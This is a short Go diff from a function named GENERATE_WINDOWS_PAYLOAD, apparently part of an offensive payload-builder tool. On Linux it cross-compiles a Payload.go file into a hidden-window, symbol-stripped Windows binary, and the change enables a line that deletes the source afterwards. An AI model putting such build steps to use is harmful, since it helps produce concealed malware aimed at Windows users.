@@ -447,7 +447,7 @@ func GENERATE_WINDOWS_PAYLOAD() {
   }else if runtime.GOOS == "linux" {
     exec.Command("sh", "-c", "export GOOS=windows && export GOARCH=386 && go build -ldflags \"-H windowsgui -s\" Payload.go && export GOOS=linux && export GOARCH=amd64").Run()
     runtime.GC()
-    //exec.Command("sh", "-c", "rm Payload.go").Run()
+    exec.Command("sh", "-c", "rm Payload.go").Run()
   }
 }
 
